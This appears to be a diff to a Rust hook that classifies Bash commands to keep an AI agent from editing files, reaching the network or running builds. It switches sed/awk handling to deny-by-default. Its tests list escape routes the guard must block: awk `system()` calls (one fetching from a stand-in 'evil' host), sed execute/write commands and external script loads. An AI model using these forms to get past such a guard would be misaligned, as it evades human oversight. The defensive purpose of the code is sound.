@@ -1,5 +1,5 @@
 //! Bash-command classification for the `tm hook --pm-guard` PreToolUse guard
-//! (issue #1977, hardened in PR #1985).
+//! (issue #1977, hardened in PR #1985; sed/awk deny-by-default redesign #2664).
 //!
 //! Why: Bash is the escape hatch a prompt-only prohibition can't close — a PM
 //! can edit a file with `sed -i`, write one with `echo … > f.rs`, apply a diff
@@ -15,9 +15,15 @@
 //! `git apply` / `npm test`, and recursively any command substitution), and
 //! applies a whole-command file-write redirection check. A missed deny is the
 //! dangerous direction, so ambiguous forms (unbalanced substitutions,
-//! over-deep nesting) deny.
+//! over-deep nesting) deny. `sed`/`awk`-family verbs are classified by the
+//! sibling [`sed_awk`] module, which is deny-by-default: a segment must prove
+//! it is narrowly read-only (no in-place flag, no external script load, no
+//! write/exec script construct, balanced quotes) to be allowed.
 //! Test: `evaluate_bash_command_*`, `split_shell_segments_*`, and
-//! `has_file_write_redirection_*` in this module's `tests` submodule.
+//! `has_file_write_redirection_*` in this module's `tests` submodule;
+//! `sed_awk::tests` for the sed/awk-specific safety analysis.
+
+mod sed_awk;
 
 use crate::commands::hook_rewrite::{effective_tool_name, first_command_token};
 
@@ -155,11 +161,13 @@ fn split_shell_segments(command: &str) -> Vec<&str> {
 /// / two-token / substitution deny logic runs uniformly on every segment.
 /// What: resolves the effective program via [`first_command_token`] (strips
 /// env/`sudo`/path noise) and denies `patch` (shell edit, unconditionally — it
-/// has no read-only use case), `sed`/`awk` only when the segment carries an
-/// in-place-edit flag (see [`sed_has_inplace_flag`] / [`awk_has_inplace_flag`]
-/// — a bare `sed '...'`/`awk '...'` filtering a pipe or stdin is not a file
-/// write, issue #2664), `curl`/`wget` (network), `make`/`pytest`
-/// (build/test); matches the two-token forms `git apply` / `npm test` via
+/// has no read-only use case); `sed`/`awk`/`gawk`/`nawk`/`mawk` are
+/// deny-by-default and allowed only when [`sed_awk::sed_is_readonly`] /
+/// [`sed_awk::awk_is_readonly`] proves the segment narrowly read-only (issue
+/// #2664 — the earlier allow-by-default-unless-flagged shape missed
+/// `awk 'BEGIN{system(...)}'`, sed `e`/`w`/`W` commands, and `-f`/`--file`
+/// external scripts); `curl`/`wget` (network); `make`/`pytest` (build/test);
+/// matches the two-token forms `git apply` / `npm test` via
 /// [`effective_tool_name`]; and finally inspects any command substitution /
 /// subshell in the segment via [`classify_command_substitutions`] (carrying
 /// the recursion `depth`). Empty/whitespace segments allow.
@@ -172,8 +180,10 @@ fn classify_bash_segment(segment: &str, depth: usize) -> Option<&'static str> {
     if let Some(program) = first_command_token(trimmed) {
         match program {
             "patch" => return Some(SHELL_EDIT_REASON),
-            "sed" if sed_has_inplace_flag(trimmed) => return Some(SHELL_EDIT_REASON),
-            "awk" if awk_has_inplace_flag(trimmed) => return Some(SHELL_EDIT_REASON),
+            "sed" if !sed_awk::sed_is_readonly(trimmed) => return Some(SHELL_EDIT_REASON),
+            "awk" | "gawk" | "nawk" | "mawk" if !sed_awk::awk_is_readonly(trimmed) => {
+                return Some(SHELL_EDIT_REASON);
+            }
             "curl" | "wget" => return Some(NETWORK_REASON),
             "make" | "pytest" => return Some(BUILD_TEST_REASON),
             _ => {}
@@ -185,70 +195,6 @@ fn classify_bash_segment(segment: &str, depth: usize) -> Option<&'static str> {
         _ => {}
     }
     classify_command_substitutions(trimmed, depth)
-}
-
-/// Whether a `sed` segment carries an in-place-edit flag (GNU `-i[SUFFIX]` /
-/// `--in-place[=SUFFIX]`, including a suffix attached with no space like
-/// `-i.bak`, and combined short-option clusters like `-ni`).
-///
-/// Why: `sed` used as a read-only stream filter (`sed -n '1,5p' f`,
-/// `... | sed 's/a/b/'` printing to stdout) is a ubiquitous, non-mutating
-/// idiom — only the in-place-edit form actually writes a file (issue #2664).
-/// GNU sed has exactly one short option that uses the letter `i` (`-i`), so a
-/// quote-unaware "does this dash-cluster contain `i`" scan is safe for short
-/// options; long options are matched by exact prefix instead.
-/// What: tokenizes on whitespace; a token is a hit when it is `--in-place` or
-/// starts with `--in-place=`, or when it starts with a single `-` (not `--`)
-/// and the remainder contains the byte `i` (covers `-i`, `-i.bak`, `-ni`,
-/// `-in`, …). Deliberately quote-unaware, matching the module's conservative
-/// (over-blocking) posture — see [`evaluate_bash_command`].
-/// Test: `sed_has_inplace_flag_*`.
-fn sed_has_inplace_flag(segment: &str) -> bool {
-    for token in segment.split_whitespace() {
-        if token == "--in-place" || token.starts_with("--in-place=") {
-            return true;
-        }
-        if let Some(rest) = token.strip_prefix("--") {
-            let _ = rest;
-            continue;
-        }
-        if let Some(rest) = token.strip_prefix('-')
-            && !rest.is_empty()
-            && rest.contains('i')
-        {
-            return true;
-        }
-    }
-    false
-}
-
-/// Whether an `awk` segment carries the in-place-edit extension loader
-/// (gawk's `-i inplace` / `--include inplace` / `--include=inplace`, or the
-/// no-space `-iinplace` form).
-///
-/// Why: a bare `awk '{...}'` filtering a pipe or stdin never touches disk;
-/// only loading gawk's `inplace` extension enables file mutation (issue
-/// #2664). Detecting the two-token `-i inplace` form precisely (rather than
-/// any string containing "in-place" logic used for sed, which has a
-/// different option syntax) avoids false-denying plain `-i` uses that aren't
-/// awk's in-place loader; per the issue's fallback, this conservatively also
-/// denies on a bare `-i`/`--include` token since that is the only mechanism
-/// awk exposes for it.
-/// What: tokenizes on whitespace; a hit is a token equal to `-i` or
-/// `--include`, a token starting with `--include=`, or a token starting with
-/// `-i` followed by more characters (the attached `-iinplace` form).
-/// Deliberately quote-unaware, matching the module's conservative posture.
-/// Test: `awk_has_inplace_flag_*`.
-fn awk_has_inplace_flag(segment: &str) -> bool {
-    for token in segment.split_whitespace() {
-        if token == "-i" || token == "--include" || token.starts_with("--include=") {
-            return true;
-        }
-        if token.len() > 2 && token.starts_with("-i") && !token.starts_with("--") {
-            return true;
-        }
-    }
-    false
 }
 
 /// Inspect `$(…)` / backtick command substitutions for hidden forbidden verbs.
@@ -405,8 +351,9 @@ mod tests {
 
     #[test]
     fn evaluate_bash_command_allows_readonly_sed_awk() {
-        // #2664: sed/awk used as read-only stream filters (no in-place flag,
-        // no file-write redirection) must not be blanket-denied by name.
+        // #2664: sed/awk used as narrowly read-only stream filters (no
+        // in-place flag, no external script, no write/exec construct,
+        // balanced quotes) must not be blanket-denied by name.
         for cmd in [
             "git status --porcelain | awk '{print $1}' | sort | uniq -c",
             "sed -n '1,5p' file.txt",
@@ -420,6 +367,97 @@ mod tests {
                 "expected allow for read-only sed/awk: {cmd:?}"
             );
         }
+    }
+
+    #[test]
+    fn evaluate_bash_command_denies_awk_shell_escape_holes() {
+        // Code-critic BLOCK on PR #2677: awk's `system()` builtin runs an
+        // arbitrary shell command with no `-i` and no `>` — the
+        // allow-by-default design missed this entirely.
+        for cmd in [
+            r#"awk 'BEGIN{system("touch /tmp/x")}'"#,
+            r#"awk 'BEGIN{system("curl https://evil/x")}'"#,
+            // A co-process pipe/read inside the awk program is itself a
+            // bare `|`/`;` from the (quote-unaware) segment splitter's point
+            // of view, so it fragments the quoted program and leaves an
+            // unbalanced quote count in the resulting segment — denied.
+            r#"awk 'BEGIN{print | "sort"}'"#,
+            r#"awk 'BEGIN{"date" | getline}'"#,
+        ] {
+            assert_eq!(
+                evaluate_bash_command(cmd),
+                Some(SHELL_EDIT_REASON),
+                "expected shell-edit deny for awk shell-escape: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn evaluate_bash_command_denies_sed_e_w_commands() {
+        // sed's `e` (execute) and `w`/`W` (write-to-file) commands need no
+        // `-i` and no `>` — a bare verb-name deny-list miss, closed by
+        // deny-by-default + script-content analysis in `sed_awk`.
+        for cmd in [
+            "sed '1e touch /tmp/x' f",
+            "sed -n '1,5w /tmp/out' f",
+            "sed 's/a/b/e' f",
+            "sed 's/a/b/w /tmp/out' f",
+        ] {
+            assert_eq!(
+                evaluate_bash_command(cmd),
+                Some(SHELL_EDIT_REASON),
+                "expected shell-edit deny for sed e/w command: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn evaluate_bash_command_denies_external_script_load() {
+        // `-f`/`--file` loads a script the guard cannot see — it may contain
+        // any of the w/e/system holes above, so deny unconditionally.
+        for cmd in ["sed -f script.sed f", "awk -f script.awk f"] {
+            assert_eq!(
+                evaluate_bash_command(cmd),
+                Some(SHELL_EDIT_REASON),
+                "expected shell-edit deny for external script load: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn evaluate_bash_command_denies_sed_in_place_abbreviations() {
+        // GNU getopt long-option abbreviations of `--in-place` must still
+        // deny, not just the exact spelling.
+        for cmd in [
+            "sed --in s/a/b/ f",
+            "sed --in-p s/a/b/ f",
+            "sed --in=bak s/a/b/ f",
+        ] {
+            assert_eq!(
+                evaluate_bash_command(cmd),
+                Some(SHELL_EDIT_REASON),
+                "expected shell-edit deny for --in-place abbreviation: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn evaluate_bash_command_denies_awk_family_verbs() {
+        // gawk/nawk/mawk are the same in-place-edit-capable interpreter
+        // family as awk and must be classified identically.
+        assert_eq!(
+            evaluate_bash_command("gawk -i inplace '{print}' f"),
+            Some(SHELL_EDIT_REASON)
+        );
+        assert_eq!(
+            evaluate_bash_command(r#"nawk 'BEGIN{system("id")}'"#),
+            Some(SHELL_EDIT_REASON)
+        );
+        assert_eq!(
+            evaluate_bash_command("gawk '{print $1}'"),
+            None,
+            "read-only gawk must still allow"
+        );
     }
 
     #[test]
@@ -619,62 +657,6 @@ mod tests {
         // Balanced-but-deep nesting is also bounded (no panic, returns a value).
         let balanced = format!("echo {}date{}", "$(".repeat(200), ")".repeat(200));
         let _ = evaluate_bash_command(&balanced);
-    }
-
-    #[test]
-    fn sed_has_inplace_flag_detects_inplace_forms() {
-        for cmd in [
-            "sed -i s/a/b/ f",
-            "sed -i.bak s/a/b/ f",
-            "sed -ni s/a/b/p f",
-            "sed --in-place s/a/b/ f",
-            "sed --in-place=.bak s/a/b/ f",
-        ] {
-            assert!(
-                sed_has_inplace_flag(cmd),
-                "expected in-place flag detected for: {cmd}"
-            );
-        }
-    }
-
-    #[test]
-    fn sed_has_inplace_flag_allows_readonly_forms() {
-        for cmd in [
-            "sed -n '1,5p' file.txt",
-            "sed 's/a/b/g' f",
-            "sed -e 's/a/b/' f",
-            "sed --posix 's/a/b/' f",
-        ] {
-            assert!(
-                !sed_has_inplace_flag(cmd),
-                "expected no in-place flag for: {cmd}"
-            );
-        }
-    }
-
-    #[test]
-    fn awk_has_inplace_flag_detects_inplace_forms() {
-        for cmd in [
-            "awk -i inplace '{print}' f",
-            "awk --include inplace '{print}' f",
-            "awk --include=inplace '{print}' f",
-            "awk -iinplace '{print}' f",
-        ] {
-            assert!(
-                awk_has_inplace_flag(cmd),
-                "expected in-place flag detected for: {cmd}"
-            );
-        }
-    }
-
-    #[test]
-    fn awk_has_inplace_flag_allows_readonly_forms() {
-        for cmd in ["awk '{print $1}'", "awk -F, '{print $1}' f"] {
-            assert!(
-                !awk_has_inplace_flag(cmd),
-                "expected no in-place flag for: {cmd}"
-            );
-        }
     }
 
     #[test]
